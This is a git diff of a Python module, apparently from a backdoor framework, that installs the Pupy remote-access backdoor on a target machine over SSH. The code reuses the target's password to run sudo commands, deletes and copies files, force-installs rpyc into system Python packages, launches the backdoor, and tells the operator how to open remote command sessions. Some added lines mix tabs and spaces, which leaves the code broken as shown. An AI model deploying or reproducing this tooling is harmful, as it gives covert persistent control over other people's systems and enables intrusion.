@@ -1,4 +1,5 @@
 from backdoor import *
+import os
 
 class Pupy(Backdoor):
     prompt = Fore.RED + "(pupy) " + Fore.BLUE + ">> " + Fore.RESET 
@@ -21,13 +22,13 @@ class Pupy(Backdoor):
         port = self.get_value("port")
         target = self.core.curtarget
         print("Thanks to n1nj4sec for the pupy backdoor. Note that this script must be run with sudo.")        
-
-        target.ssh.exec_command('rm -r pupy')
-        target.scpFiles(self, 'backdoors/shell/pupy/pupy', True)
+	os.system("rm pupy/pupy/packages/all/scapy")
+        target.ssh.exec_command("echo " + target.pword + ' | sudo -S rm -rf pupy')
+        target.scpFiles(self, 'pupy/pupy', True)
         target.scpFiles(self, 'rpyc', True)
         target.ssh.exec_command("echo " + target.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
-        raw_input("Please navigate to the backdoors/pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
-        target.ssh.exec_command(self.get_command())
+        raw_input("Please navigate to the backdoorme/pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
+	target.ssh.exec_command(self.get_command())
         
         raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
 
